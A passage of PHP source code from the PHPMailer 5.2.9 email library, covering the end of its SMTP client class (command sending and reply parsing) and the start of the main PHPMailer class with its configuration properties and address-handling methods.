        }
        return $noerror;
    }

    /**
     * Parse a reply to HELO/EHLO command to discover server extensions.
     * In case of HELO, the only parameter that can be discovered is a server name.
     * @access protected
     * @param string $type - 'HELO' or 'EHLO'
     */
    protected function parseHelloFields($type)
    {
        $this->server_caps = array();
        $lines = explode("\n", $this->last_reply);
        foreach ($lines as $n => $s) {
            $s = trim(substr($s, 4));
            if (!$s) {
                continue;
            }
            $fields = explode(' ', $s);
            if ($fields) {
                if (!$n) {
                    $name = $type;
                    $fields = $fields[0];
                } else {
                    $name = array_shift($fields);
                    if ($name == 'SIZE') {
                        $fields = ($fields) ? $fields[0] : 0;
                    }
                }
                $this->server_caps[$name] = ($fields ? $fields : true);
            }
        }
    }

    /**
     * Send an SMTP MAIL command.
     * Starts a mail transaction from the email address specified in
     * $from. Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command.
     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>
     * @param string $from Source address of this message
     * @access public
     * @return boolean
     */
    public function mail($from)
    {
        $useVerp = ($this->do_verp ? ' XVERP' : '');
        return $this->sendCommand(
            'MAIL FROM',
            'MAIL FROM:<' . $from . '>' . $useVerp,
            250
        );
    }

    /**
     * Send an SMTP QUIT command.
     * Closes the socket if there is no error or the $close_on_error argument is true.
     * Implements from rfc 821: QUIT <CRLF>
     * @param boolean $close_on_error Should the connection close if an error occurs?
     * @access public
     * @return boolean
     */
    public function quit($close_on_error = true)
    {
        $noerror = $this->sendCommand('QUIT', 'QUIT', 221);
        $err = $this->error; //Save any error
        if ($noerror or $close_on_error) {
            $this->close();
            $this->error = $err; //Restore any error from the quit command
        }
        return $noerror;
    }

    /**
     * Send an SMTP RCPT command.
     * Sets the TO argument to $toaddr.
     * Returns true if the recipient was accepted false if it was rejected.
     * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
     * @param string $toaddr The address the message is being sent to
     * @access public
     * @return boolean
     */
    public function recipient($toaddr)
    {
        return $this->sendCommand(
            'RCPT TO',
            'RCPT TO:<' . $toaddr . '>',
            array(250, 251)
        );
    }

    /**
     * Send an SMTP RSET command.
     * Abort any transaction that is currently in progress.
     * Implements rfc 821: RSET <CRLF>
     * @access public
     * @return boolean True on success.
     */
    public function reset()
    {
        return $this->sendCommand('RSET', 'RSET', 250);
    }

    /**
     * Send a command to an SMTP server and check its return code.
     * @param string $command       The command name - not sent to the server
     * @param string $commandstring The actual command to send
     * @param integer|array $expect     One or more expected integer success codes
     * @access protected
     * @return boolean True on success.
     */
    protected function sendCommand($command, $commandstring, $expect)
    {
        if (!$this->connected()) {
            $this->error = array(
                'error' => "Called $command without being connected"
            );
            return false;
        }
        $this->client_send($commandstring . self::CRLF);

        $this->last_reply = $this->get_lines();
        // Fetch SMTP code and possible error code explanation
        $matches = array();
        if (preg_match("/^([0-9]{3})[ -](?:([0-9]\\.[0-9]\\.[0-9]) )?/", $this->last_reply, $matches)) {
            $code = $matches[1];
            $code_ex = (count($matches) > 2 ? $matches[2] : null);
            // Cut off error code from each response line
            $detail = preg_replace(
                "/{$code}[ -]".($code_ex ? str_replace('.', '\\.', $code_ex).' ' : '')."/m",
                '',
                $this->last_reply
            );
        } else { // Fall back to simple parsing if regex fails
            $code = substr($this->last_reply, 0, 3);
            $code_ex = null;
            $detail = substr($this->last_reply, 4);
        }

        $this->edebug('SERVER -> CLIENT: ' . $this->last_reply, self::DEBUG_SERVER);

        if (!in_array($code, (array)$expect)) {
            $this->error = array(
                'error' => "$command command failed",
                'smtp_code' => $code,
                'smtp_code_ex' => $code_ex,
                'detail' => $detail
            );
            $this->edebug(
                'SMTP ERROR: ' . $this->error['error'] . ': ' . $this->last_reply,
                self::DEBUG_CLIENT
            );
            return false;
        }

        $this->error = array();
        return true;
    }

    /**
     * Send an SMTP SAML command.
     * Starts a mail transaction from the email address specified in $from.
     * Returns true if successful or false otherwise. If True
     * the mail transaction is started and then one or more recipient
     * commands may be called followed by a data command. This command
     * will send the message to the users terminal if they are logged
     * in and send them an email.
     * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
     * @param string $from The address the message is from
     * @access public
     * @return boolean
     */
    public function sendAndMail($from)
    {
        return $this->sendCommand('SAML', "SAML FROM:$from", 250);
    }

    /**
     * Send an SMTP VRFY command.
     * @param string $name The name to verify
     * @access public
     * @return boolean
     */
    public function verify($name)
    {
        return $this->sendCommand('VRFY', "VRFY $name", array(250, 251));
    }

    /**
     * Send an SMTP NOOP command.
     * Used to keep keep-alives alive, doesn't actually do anything
     * @access public
     * @return boolean
     */
    public function noop()
    {
        return $this->sendCommand('NOOP', 'NOOP', 250);
    }

    /**
     * Send an SMTP TURN command.
     * This is an optional command for SMTP that this class does not support.
     * This method is here to make the RFC821 Definition complete for this class
     * and _may_ be implemented in future
     * Implements from rfc 821: TURN <CRLF>
     * @access public
     * @return boolean
     */
    public function turn()
    {
        $this->error = array(
            'error' => 'The SMTP TURN command is not implemented'
        );
        $this->edebug('SMTP NOTICE: ' . $this->error['error'], self::DEBUG_CLIENT);
        return false;
    }

    /**
     * Send raw data to the server.
     * @param string $data The data to send
     * @access public
     * @return integer|boolean The number of bytes sent to the server or false on error
     */
    public function client_send($data)
    {
        $this->edebug("CLIENT -> SERVER: $data", self::DEBUG_CLIENT);
        return fwrite($this->smtp_conn, $data);
    }

    /**
     * Get the latest error.
     * @access public
     * @return array
     */
    public function getError()
    {
        return $this->error;
    }

    /**
     * Get SMTP extensions available on the server
     * @access public
     * @return array|null
     */
    public function getServerExtList()
    {
        return $this->server_caps;
    }

    /**
     * A multipurpose method
     * The method works in three ways, dependent on argument value and current state
     *   1. HELO/EHLO was not sent - returns null and set up $this->error
     *   2. HELO was sent
     *     $name = 'HELO': returns server name
     *     $name = 'EHLO': returns boolean false
     *     $name = any string: returns null and set up $this->error
     *   3. EHLO was sent
     *     $name = 'HELO'|'EHLO': returns server name
     *     $name = any string: if extension $name exists, returns boolean True
     *       or its options. Otherwise returns boolean False
     * In other words, one can use this method to detect 3 conditions:
     *  - null returned: handshake was not or we don't know about ext (refer to $this->error)
     *  - false returned: the requested feature exactly not exists
     *  - positive value returned: the requested feature exists
     * @param string $name Name of SMTP extension or 'HELO'|'EHLO'
     * @return mixed
     */
    public function getServerExt($name)
    {
        if (!$this->server_caps) {
            $this->error = array('No HELO/EHLO was sent');
            return null;
        }

        // the tight logic knot ;)
        if (!array_key_exists($name, $this->server_caps)) {
            if ($name == 'HELO') {
                return $this->server_caps['EHLO'];
            }
            if ($name == 'EHLO' || array_key_exists('EHLO', $this->server_caps)) {
                return false;
            }
            $this->error = array('HELO handshake was used. Client knows nothing about server extensions');
            return null;
        }

        return $this->server_caps[$name];
    }

    /**
     * Get the last reply from the server.
     * @access public
     * @return string
     */
    public function getLastReply()
    {
        return $this->last_reply;
    }

    /**
     * Read the SMTP server's response.
     * Either before eof or socket timeout occurs on the operation.
     * With SMTP we can tell if we have more lines to read if the
     * 4th character is '-' symbol. If it is a space then we don't
     * need to read anything else.
     * @access protected
     * @return string
     */
    protected function get_lines()
    {
        // If the connection is bad, give up straight away
        if (!is_resource($this->smtp_conn)) {
            return '';
        }
        $data = '';
        $endtime = 0;
        stream_set_timeout($this->smtp_conn, $this->Timeout);
        if ($this->Timelimit > 0) {
            $endtime = time() + $this->Timelimit;
        }
        while (is_resource($this->smtp_conn) && !feof($this->smtp_conn)) {
            $str = @fgets($this->smtp_conn, 515);
            $this->edebug("SMTP -> get_lines(): \$data was \"$data\"", self::DEBUG_LOWLEVEL);
            $this->edebug("SMTP -> get_lines(): \$str is \"$str\"", self::DEBUG_LOWLEVEL);
            $data .= $str;
            $this->edebug("SMTP -> get_lines(): \$data is \"$data\"", self::DEBUG_LOWLEVEL);
            // If 4th character is a space, we are done reading, break the loop, micro-optimisation over strlen
            if ((isset($str[3]) and $str[3] == ' ')) {
                break;
            }
            // Timed-out? Log and break
            $info = stream_get_meta_data($this->smtp_conn);
            if ($info['timed_out']) {
                $this->edebug(
                    'SMTP -> get_lines(): timed-out (' . $this->Timeout . ' sec)',
                    self::DEBUG_LOWLEVEL
                );
                break;
            }
            // Now check if reads took too long
            if ($endtime and time() > $endtime) {
                $this->edebug(
                    'SMTP -> get_lines(): timelimit reached ('.
                    $this->Timelimit . ' sec)',
                    self::DEBUG_LOWLEVEL
                );
                break;
            }
        }
        return $data;
    }

    /**
     * Enable or disable VERP address generation.
     * @param boolean $enabled
     */
    public function setVerp($enabled = false)
    {
        $this->do_verp = $enabled;
    }

    /**
     * Get VERP address generation mode.
     * @return boolean
     */
    public function getVerp()
    {
        return $this->do_verp;
    }

    /**
     * Set debug output method.
     * @param string|callable $method The name of the mechanism to use for debugging output, or a callable to handle it.
     */
    public function setDebugOutput($method = 'echo')
    {
        $this->Debugoutput = $method;
    }

    /**
     * Get debug output method.
     * @return string
     */
    public function getDebugOutput()
    {
        return $this->Debugoutput;
    }

    /**
     * Set debug output level.
     * @param integer $level
     */
    public function setDebugLevel($level = 0)
    {
        $this->do_debug = $level;
    }

    /**
     * Get debug output level.
     * @return integer
     */
    public function getDebugLevel()
    {
        return $this->do_debug;
    }

    /**
     * Set SMTP timeout.
     * @param integer $timeout
     */
    public function setTimeout($timeout = 0)
    {
        $this->Timeout = $timeout;
    }

    /**
     * Get SMTP timeout.
     * @return integer
     */
    public function getTimeout()
    {
        return $this->Timeout;
    }
}

?>
<?php
/**
 * PHPMailer - PHP email creation and transport class.
 * PHP Version 5
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <m>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 * @copyright 2012 - 2014 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE.
 */

/**
 * PHPMailer - PHP email creation and transport class.
 * @package PHPMailer
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (original founder)
 */
class PHPMailer
{
    /**
     * The PHPMailer Version number.
     * @type string
     */
    public $Version = '5.2.9';

    /**
     * Email priority.
     * Options: 1 = High, 3 = Normal, 5 = low.
     * @type integer
     */
    public $Priority = 3;

    /**
     * The character set of the message.
     * @type string
     */
    public $CharSet = 'iso-8859-1';

    /**
     * The MIME Content-type of the message.
     * @type string
     */
    public $ContentType = 'text/plain';

    /**
     * The message encoding.
     * Options: "8bit", "7bit", "binary", "base64", and "quoted-printable".
     * @type string
     */
    public $Encoding = '8bit';

    /**
     * Holds the most recent mailer error message.
     * @type string
     */
    public $ErrorInfo = '';

    /**
     * The From email address for the message.
     * @type string
     */
    public $From = 'root@localhost';

    /**
     * The From name of the message.
     * @type string
     */
    public $FromName = 'Root User';

    /**
     * The Sender email (Return-Path) of the message.
     * If not empty, will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
     * @type string
     */
    public $Sender = '';

    /**
     * The Return-Path of the message.
     * If empty, it will be set to either From or Sender.
     * @type string
     * @deprecated Email senders should never set a return-path header;
     * it's the receiver's job (RFC5321 section 4.4), so this no longer does anything.
     * @link https://tools.ietf.org/html/rfc5321#section-4.4 RFC5321 reference
     */
    public $ReturnPath = '';

    /**
     * The Subject of the message.
     * @type string
     */
    public $Subject = '';

    /**
     * An HTML or plain text message body.
     * If HTML then call isHTML(true).
     * @type string
     */
    public $Body = '';

    /**
     * The plain-text message body.
     * This body can be read by mail clients that do not have HTML email
     * capability such as mutt & Eudora.
     * Clients that can read HTML will view the normal Body.
     * @type string
     */
    public $AltBody = '';

    /**
     * An iCal message part body.
     * Only supported in simple alt or alt_inline message types
     * To generate iCal events, use the bundled extras/EasyPeasyICS.php class or iCalcreator
     * @link http://sprain.ch/blog/downloads/php-class-easypeasyics-create-ical-files-with-php/
     * @link http://kigkonsult.se/iCalcreator/
     * @type string
     */
    public $Ical = '';

    /**
     * The complete compiled MIME message body.
     * @access protected
     * @type string
     */
    protected $MIMEBody = '';

    /**
     * The complete compiled MIME message headers.
     * @type string
     * @access protected
     */
    protected $MIMEHeader = '';

    /**
     * Extra headers that createHeader() doesn't fold in.
     * @type string
     * @access protected
     */
    protected $mailHeader = '';

    /**
     * Word-wrap the message body to this number of chars.
     * Set to 0 to not wrap. A useful value here is 78, for RFC2822 section 2.1.1 compliance.
     * @type integer
     */
    public $WordWrap = 0;

    /**
     * Which method to use to send mail.
     * Options: "mail", "sendmail", or "smtp".
     * @type string
     */
    public $Mailer = 'mail';

    /**
     * The path to the sendmail program.
     * @type string
     */
    public $Sendmail = '/usr/sbin/sendmail';

    /**
     * Whether mail() uses a fully sendmail-compatible MTA.
     * One which supports sendmail's "-oi -f" options.
     * @type boolean
     */
    public $UseSendmailOptions = true;

    /**
     * Path to PHPMailer plugins.
     * Useful if the SMTP class is not in the PHP include path.
     * @type string
     * @deprecated Should not be needed now there is an autoloader.
     */
    public $PluginDir = '';

    /**
     * The email address that a reading confirmation should be sent to.
     * @type string
     */
    public $ConfirmReadingTo = '';

    /**
     * The hostname to use in Message-Id and Received headers
     * and as default HELO string.
     * If empty, the value returned
     * by SERVER_NAME is used or 'localhost.localdomain'.
     * @type string
     */
    public $Hostname = '';

    /**
     * An ID to be used in the Message-Id header.
     * If empty, a unique id will be generated.
     * @type string
     */
    public $MessageID = '';

    /**
     * The message Date to be used in the Date header.
     * If empty, the current date will be added.
     * @type string
     */
    public $MessageDate = '';

    /**
     * SMTP hosts.
     * Either a single hostname or multiple semicolon-delimited hostnames.
     * You can also specify a different port
     * for each host by using this format: [hostname:port]
     * (e.g. "smtp1.example.com:25;smtp2.example.com").
     * You can also specify encryption type, for example:
     * (e.g. "tls://smtp1.example.com:587;ssl://smtp2.example.com:465").
     * Hosts will be tried in order.
     * @type string
     */
    public $Host = 'localhost';

    /**
     * The default SMTP server port.
     * @type integer
     * @TODO Why is this needed when the SMTP class takes care of it?
     */
    public $Port = 25;

    /**
     * The SMTP HELO of the message.
     * Default is $Hostname.
     * @type string
     * @see PHPMailer::$Hostname
     */
    public $Helo = '';

    /**
     * The secure connection prefix.
     * Options: "", "ssl" or "tls"
     * @type string
     */
    public $SMTPSecure = '';

    /**
     * Whether to use SMTP authentication.
     * Uses the Username and Password properties.
     * @type boolean
     * @see PHPMailer::$Username
     * @see PHPMailer::$Password
     */
    public $SMTPAuth = false;

    /**
     * SMTP username.
     * @type string
     */
    public $Username = '';

    /**
     * SMTP password.
     * @type string
     */
    public $Password = '';

    /**
     * SMTP auth type.
     * Options are LOGIN (default), PLAIN, NTLM, CRAM-MD5
     * @type string
     */
    public $AuthType = '';

    /**
     * SMTP realm.
     * Used for NTLM auth
     * @type string
     */
    public $Realm = '';

    /**
     * SMTP workstation.
     * Used for NTLM auth
     * @type string
     */
    public $Workstation = '';

    /**
     * The SMTP server timeout in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @type integer
     */
    public $Timeout = 300;

    /**
     * SMTP class debug output mode.
     * Debug output level.
     * Options:
     * * `0` No output
     * * `1` Commands
     * * `2` Data and commands
     * * `3` As 2 plus connection status
     * * `4` Low-level data output
     * @type integer
     * @see SMTP::$do_debug
     */
    public $SMTPDebug = 0;

    /**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $mail->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @type string|callable
     * @see SMTP::$Debugoutput
     */
    public $Debugoutput = 'echo';

    /**
     * Whether to keep SMTP connection open after each message.
     * If this is set to true then to close the connection
     * requires an explicit call to smtpClose().
     * @type boolean
     */
    public $SMTPKeepAlive = false;

    /**
     * Whether to split multiple to addresses into multiple messages
     * or send them all in one message.
     * @type boolean
     */
    public $SingleTo = false;

    /**
     * Storage for addresses when SingleTo is enabled.
     * @type array
     * @TODO This should really not be public
     */
    public $SingleToArray = array();

    /**
     * Whether to generate VERP addresses on send.
     * Only applicable when sending via SMTP.
     * @link http://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Postfix VERP info
     * @type boolean
     */
    public $do_verp = false;

    /**
     * Whether to allow sending messages with an empty body.
     * @type boolean
     */
    public $AllowEmpty = false;

    /**
     * The default line ending.
     * @note The default remains "\n". We force CRLF where we know
     *        it must be used via self::CRLF.
     * @type string
     */
    public $LE = "\n";

    /**
     * DKIM selector.
     * @type string
     */
    public $DKIM_selector = '';

    /**
     * DKIM Identity.
     * Usually the email address used as the source of the email
     * @type string
     */
    public $DKIM_identity = '';

    /**
     * DKIM passphrase.
     * Used if your key is encrypted.
     * @type string
     */
    public $DKIM_passphrase = '';

    /**
     * DKIM signing domain name.
     * @example 'example.com'
     * @type string
     */
    public $DKIM_domain = '';

    /**
     * DKIM private key file path.
     * @type string
     */
    public $DKIM_private = '';

    /**
     * Callback Action function name.
     *
     * The function that handles the result of the send email action.
     * It is called out by send() for each email sent.
     *
     * Value can be any php callable: http://www.php.net/is_callable
     *
     * Parameters:
     *   boolean $result        result of the send action
     *   string  $to            email address of the recipient
     *   string  $cc            cc email addresses
     *   string  $bcc           bcc email addresses
     *   string  $subject       the subject
     *   string  $body          the email body
     *   string  $from          email address of sender
     * @type string
     */
    public $action_function = '';

    /**
     * What to use in the X-Mailer header.
     * Options: null for default, whitespace for none, or a string to use
     * @type string
     */
    public $XMailer = '';

    /**
     * An instance of the SMTP sender class.
     * @type SMTP
     * @access protected
     */
    protected $smtp = null;

    /**
     * The array of 'to' addresses.
     * @type array
     * @access protected
     */
    protected $to = array();

    /**
     * The array of 'cc' addresses.
     * @type array
     * @access protected
     */
    protected $cc = array();

    /**
     * The array of 'bcc' addresses.
     * @type array
     * @access protected
     */
    protected $bcc = array();

    /**
     * The array of reply-to names and addresses.
     * @type array
     * @access protected
     */
    protected $ReplyTo = array();

    /**
     * An array of all kinds of addresses.
     * Includes all of $to, $cc, $bcc, $replyto
     * @type array
     * @access protected
     */
    protected $all_recipients = array();

    /**
     * The array of attachments.
     * @type array
     * @access protected
     */
    protected $attachment = array();

    /**
     * The array of custom headers.
     * @type array
     * @access protected
     */
    protected $CustomHeader = array();

    /**
     * The most recent Message-ID (including angular brackets).
     * @type string
     * @access protected
     */
    protected $lastMessageID = '';

    /**
     * The message's MIME type.
     * @type string
     * @access protected
     */
    protected $message_type = '';

    /**
     * The array of MIME boundary strings.
     * @type array
     * @access protected
     */
    protected $boundary = array();

    /**
     * The array of available languages.
     * @type array
     * @access protected
     */
    protected $language = array();

    /**
     * The number of errors encountered.
     * @type integer
     * @access protected
     */
    protected $error_count = 0;

    /**
     * The S/MIME certificate file path.
     * @type string
     * @access protected
     */
    protected $sign_cert_file = '';

    /**
     * The S/MIME key file path.
     * @type string
     * @access protected
     */
    protected $sign_key_file = '';

    /**
     * The S/MIME password for the key.
     * Used only if the key is encrypted.
     * @type string
     * @access protected
     */
    protected $sign_key_pass = '';

    /**
     * Whether to throw exceptions for errors.
     * @type boolean
     * @access protected
     */
    protected $exceptions = false;

    /**
     * Error severity: message only, continue processing.
     */
    const STOP_MESSAGE = 0;

    /**
     * Error severity: message, likely ok to continue processing.
     */
    const STOP_CONTINUE = 1;

    /**
     * Error severity: message, plus full stop, critical error reached.
     */
    const STOP_CRITICAL = 2;

    /**
     * SMTP RFC standard line ending.
     */
    const CRLF = "\r\n";

    /**
     * Constructor.
     * @param boolean $exceptions Should we throw external exceptions?
     */
    public function __construct($exceptions = false)
    {
        $this->exceptions = (boolean)$exceptions;
    }

    /**
     * Destructor.
     */
    public function __destruct()
    {
        if ($this->Mailer == 'smtp') { //close any open SMTP connection nicely
            $this->smtpClose();
        }
    }

    /**
     * Call mail() in a safe_mode-aware fashion.
     * Also, unless sendmail_path points to sendmail (or something that
     * claims to be sendmail), don't pass params (not a perfect fix,
     * but it will do)
     * @param string $to To
     * @param string $subject Subject
     * @param string $body Message Body
     * @param string $header Additional Header(s)
     * @param string $params Params
     * @access private
     * @return boolean
     */
    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }
        if (ini_get('safe_mode') || !($this->UseSendmailOptions)) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
        }
        return $result;
    }

    /**
     * Output debugging info via user-defined method.
     * Only generates output if SMTP debug output is enabled (@see SMTP::$do_debug).
     * @see PHPMailer::$Debugoutput
     * @see PHPMailer::$SMTPDebug
     * @param string $str
     */
    protected function edebug($str)
    {
        if ($this->SMTPDebug <= 0) {
            return;
        }
        //Avoid clash with built-in function names
        if (!in_array($this->Debugoutput, array('error_log', 'html', 'echo')) and is_callable($this->Debugoutput)) {
            call_user_func($this->Debugoutput, $str, $this->SMTPDebug);
            return;
        }
        switch ($this->Debugoutput) {
            case 'error_log':
                //Don't output, just log
                error_log($str);
                break;
            case 'html':
                //Cleans up output a bit for a better looking, HTML-safe output
                echo htmlentities(
                    preg_replace('/[\r\n]+/', '', $str),
                    ENT_QUOTES,
                    'UTF-8'
                )
                . "<br>\n";
                break;
            case 'echo':
            default:
                //Normalize line breaks
                $str = preg_replace('/(\r\n|\r|\n)/ms', "\n", $str);
                echo gmdate('Y-m-d H:i:s') . "\t" . str_replace(
                    "\n",
                    "\n                   \t                  ",
                    trim($str)
                ) . "\n";
        }
    }

    /**
     * Sets message type to HTML or plain.
     * @param boolean $isHtml True for HTML mode.
     * @return void
     */
    public function isHTML($isHtml = true)
    {
        if ($isHtml) {
            $this->ContentType = 'text/html';
        } else {
            $this->ContentType = 'text/plain';
        }
    }

    /**
     * Send messages using SMTP.
     * @return void
     */
    public function isSMTP()
    {
        $this->Mailer = 'smtp';
    }

    /**
     * Send messages using PHP's mail() function.
     * @return void
     */
    public function isMail()
    {
        $this->Mailer = 'mail';
    }

    /**
     * Send messages using $Sendmail.
     * @return void
     */
    public function isSendmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'sendmail')) {
            $this->Sendmail = '/usr/sbin/sendmail';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'sendmail';
    }

    /**
     * Send messages using qmail.
     * @return void
     */
    public function isQmail()
    {
        $ini_sendmail_path = ini_get('sendmail_path');

        if (!stristr($ini_sendmail_path, 'qmail')) {
            $this->Sendmail = '/var/qmail/bin/qmail-inject';
        } else {
            $this->Sendmail = $ini_sendmail_path;
        }
        $this->Mailer = 'qmail';
    }

    /**
     * Add a "To" address.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addAddress($address, $name = '')
    {
        return $this->addAnAddress('to', $address, $name);
    }

    /**
     * Add a "CC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addCC($address, $name = '')
    {
        return $this->addAnAddress('cc', $address, $name);
    }

    /**
     * Add a "BCC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address
     * @param string $name
     * @return boolean true on success, false if address already used
     */
    public function addBCC($address, $name = '')
    {
        return $this->addAnAddress('bcc', $address, $name);
    }

    /**
     * Add a "Reply-to" address.
     * @param string $address
     * @param string $name
     * @return boolean
     */
    public function addReplyTo($address, $name = '')
    {
        return $this->addAnAddress('Reply-To', $address, $name);
    }

    /**
     * Add an address to one of the recipient arrays.
     * Addresses that have been added already return false, but do not throw exceptions
     * @param string $kind One of 'to', 'cc', 'bcc', 'ReplyTo'
     * @param string $address The email address to send to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */
    protected function addAnAddress($kind, $address, $name = '')
    {
        if (!preg_match('/^(to|cc|bcc|Reply-To)$/', $kind)) {
            $this->setError($this->lang('Invalid recipient array') . ': ' . $kind);
            $this->edebug($this->lang('Invalid recipient array') . ': ' . $kind);
            if ($this->exceptions) {
                throw new phpmailerException('Invalid recipient array: ' . $kind);
            }
            return false;
        }
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        if (!$this->validateAddress($address)) {
            $this->setError($this->lang('invalid_address') . ': ' . $address);
            $this->edebug($this->lang('invalid_address') . ': ' . $address);
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
            }
            return false;
        }
        if ($kind != 'Reply-To') {
            if (!isset($this->all_recipients[strtolower($address)])) {
                array_push($this->$kind, array($address, $name));
                $this->all_recipients[strtolower($address)] = true;
                return true;
            }
        } else {
            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
                $this->ReplyTo[strtolower($address)] = array($address, $name);
                return true;
            }
        }
        return false;
    }

    /**
     * Set the From and FromName properties.
     * @param string $address
     * @param string $name
     * @param boolean $auto Whether to also set the Sender address, defaults to true
     * @throws phpmailerException
     * @return boolean
     */
    public function setFrom($address, $name = '', $auto = true)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        if (!$this->validateAddress($address)) {
            $this->setError($this->lang('invalid_address') . ': ' . $address);
            $this->edebug($this->lang('invalid_address') . ': ' . $address);
            if ($this->exceptions) {
                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
            }
            return false;
        }
        $this->From = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }

    /**
     * Return the Message-ID header of the last email.
     * Technically this is the value from the last time the headers were created,
     * but it's also the message ID of the last sent message except in
     * pathological cases.
     * @return string
     */
    public function getLastMessageID()
    {
        return $this->lastMessageID;
    }

    /**
     * Check that a string looks like an email address.
     * @param string $address The email address to check
     * @param string $patternselect A selector for the validation pattern to use :
     * * `auto` Pick strictest one automatically;
     * * `pcre8` Use the squiloople.com pattern, requires PCRE > 8.0, PHP >= 5.3.2, 5.2.14;
     * * `pcre` Use old PCRE implementation;
     * * `php` Use PHP built-in FILTER_VALIDATE_EMAIL; same as pcre8 but does not allow 'dotless' domains;
     * * `html5` Use the pattern given by the HTML5 spec for 'email' type form input elements.
     * * `noregex` Don't use a regex: super fast, really dumb.
     * @return boolean
     * @static
     * @access public
     */
    public static function validateAddress($address, $patternselect = 'auto')
    {
        if (!$patternselect or $patternselect == 'auto') {
            //Check this constant first so it works when extension_loaded() is disabled by safe mode
            //Constant was added in PHP 5.2.4
            if (defined('PCRE_VERSION')) {
                //This pattern can get stuck in a recursive loop in PCRE <= 8.0.2
                if (version_compare(PCRE_VERSION, '8.0.3') >= 0) {
                    $patternselect = 'pcre8';
                } else {
                    $patternselect = 'pcre';
                }
            } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {
                //Fall back to older PCRE
                $patternselect = 'pcre';
            } else {
                //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension
                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
                    $patternselect = 'php';
                } else {
                    $patternselect = 'noregex';
                }
            }
        }
        switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
            case 'pcre':
